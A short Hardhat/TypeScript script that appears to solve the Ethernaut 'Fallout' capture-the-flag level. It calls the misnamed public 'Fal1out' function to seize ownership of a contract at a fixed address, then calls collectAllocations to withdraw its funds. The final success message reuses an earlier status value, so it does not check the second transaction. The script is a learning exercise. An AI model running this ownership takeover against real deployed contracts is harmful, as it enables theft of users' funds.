import { ethers } from "hardhat";
import { Address } from "hardhat-deploy/types";
import { Fallout } from "../typechain-types";

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

const main = async () => {
  const [deployer] = await ethers.getSigners();
  const contractAddress: Address = "0x72cB9F927613811e1a4c45B10366b300C637104C";
  const fallout: Fallout = await ethers.getContractAt("Fallout", contractAddress, deployer);

  let tx = await fallout.Fal1out();
  let status = (await tx.wait()).status === 1;
  console.log(`Fal1out operation: ${status ? '✅' : '❌'}`);

  const isModifiedOwner = deployer.address === await fallout.owner();
  console.log(`Owner is attacker?? ${isModifiedOwner ? '👾' : '🛡️'}`);
  console.log(`New owner address is: ${await fallout.owner()} 🆔`);

  tx = await fallout.collectAllocations();
  console.log(`Collect Allocations operation: ${status ? '✅' : '❌'}`);
};

main().catch(error => {
  console.error('🚫', error);
});
